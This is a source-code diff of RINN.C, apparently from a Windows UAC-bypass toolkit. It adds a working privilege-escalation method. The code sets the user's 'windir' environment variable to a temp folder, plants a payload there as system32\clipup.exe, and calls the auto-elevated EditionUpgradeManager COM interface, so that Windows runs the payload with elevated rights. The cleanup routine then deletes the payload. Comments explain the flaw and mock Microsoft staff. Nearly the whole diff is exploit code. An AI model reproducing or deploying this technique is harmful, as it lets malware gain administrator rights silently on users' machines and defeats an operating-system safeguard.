@@ -4,11 +4,11 @@
 *
 *  TITLE:       RINN.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.20
 *
-*  DATE:        18 Mar 2019
+*  DATE:        24 Oct 2019
 *
-*  rinn UAC bypass using CreateNewLink interface.
+*  rinn & hfiref0x UAC bypass methods.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -26,7 +26,6 @@
 * Post execution cleanup routine for CreateNewLinkMethod.
 *
 */
-
 BOOL ucmCreateNewLinkMethodCleanup(
     VOID
 )
@@ -38,6 +37,29 @@ BOOL ucmCreateNewLinkMethodCleanup(
     _strcat(szBuffer, WBEMCOMN_DLL);
 
     return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+}
+
+/*
+* ucmEditionUpgradeManagerMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for EditionUpgradeManagerMethod.
+*
+*/
+
+BOOL ucmEditionUpgradeManagerMethodCleanup(
+    VOID
+)
+{
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szTempDirectory);
+    _strcat(szBuffer, T_KUREND);
+    _strcat(szBuffer, SYSTEM32_DIR);
+    _strcat(szBuffer, CLIPUP_EXE);
+
+    return DeleteFile(szBuffer);
 }
 
 /*
@@ -68,7 +90,7 @@ NTSTATUS ucmCreateNewLinkMethod(
 )
 {
     NTSTATUS            MethodResult = STATUS_ACCESS_DENIED;
-    
+
 #ifndef _WIN64
     NTSTATUS Status;
 #endif
@@ -164,6 +186,127 @@ NTSTATUS ucmCreateNewLinkMethod(
         supEnableDisableWow64Redirection(FALSE);
     }
 #endif
+
+    if (hr_init == S_OK)
+        CoUninitialize();
+
+    return MethodResult;
+}
+
+/*
+* ucmCreateNewLinkMethod
+*
+* Purpose:
+*
+* Bypass UAC using EditionUpgradeManager autoelevated interface.
+* This function expects that supMasqueradeProcess was called on process initialization.
+*
+* EditionUpgradeManager has method called AcquireModernLicenseWithPreviousId.
+* During it execution MS code starts Clipup.exe process from (what it suppose) windows system32 folder.
+* However since MS programmers always lazy and banned in their own documentation it uses
+* environment variable "windir" to expand Windows directory instead of using something like GetSystemDirectory.
+* This giving us opportunity (hello Nadela) to spoof current user environment variable for requested DllHost.exe
+* thus turning their code launch our clipup.exe from our controlled location.
+*
+*/
+NTSTATUS ucmEditionUpgradeManagerMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    NTSTATUS                    MethodResult = STATUS_ACCESS_DENIED;
+    BOOL                        bEnvSet = FALSE;
+    HRESULT                     hr = E_UNEXPECTED, hr_init;
+    IEditionUpgradeManager     *Manager = NULL;
+
+    DWORD Data[3];
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+    do {
+
+        //
+        // Replace default Fubuki dll entry point with new and remove dll flag.
+        //
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_DEFAULT_ENTRYPOINT,
+            TRUE))
+        {
+            break;
+        }
+
+        //
+        // Create %temp%\KureND directory.
+        //
+        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, T_KUREND);
+
+        if (!CreateDirectory(szBuffer, NULL))
+            if (GetLastError() != ERROR_ALREADY_EXISTS)
+                break;
+
+        //
+        // Set controlled environment variable.
+        //
+        bEnvSet = supSetEnvVariable(FALSE,
+            NULL,
+            T_WINDIR,
+            szBuffer);
+
+        if (!bEnvSet)
+            break;
+
+        //
+        // Create %temp%\KureND\system32 directory.
+        //
+        _strcat(szBuffer, SYSTEM32_DIR);
+        if (!CreateDirectory(szBuffer, NULL))
+            if (GetLastError() != ERROR_ALREADY_EXISTS)
+                break;
+
+        //
+        // Drop payload to %temp%\system32 as clipup.exe and run target interface.
+        //
+        _strcat(szBuffer, CLIPUP_EXE);
+        if (supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
+
+            hr = ucmAllocateElevatedObject(T_CLSID_EditionUpgradeManager,
+                &IID_EditionUpgradeManager,
+                CLSCTX_LOCAL_SERVER,
+                &Manager);
+
+            if (hr != S_OK)
+                break;
+
+            if (Manager == NULL) {
+                hr = E_OUTOFMEMORY;
+                break;
+            }
+
+            Data[0] = 'f';
+            Data[1] = 'f';
+            Data[2] = 0;
+
+            Manager->lpVtbl->AcquireModernLicenseWithPreviousId(Manager, MYSTERIOUSCUTETHING, (DWORD*)&Data);
+
+        }
+
+    } while (FALSE);
+
+    if (Manager)
+        Manager->lpVtbl->Release(Manager);
+
+    //
+    // Cleanup if requested.
+    //
+    if (bEnvSet)
+        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
+
 
     if (hr_init == S_OK)
         CoUninitialize();
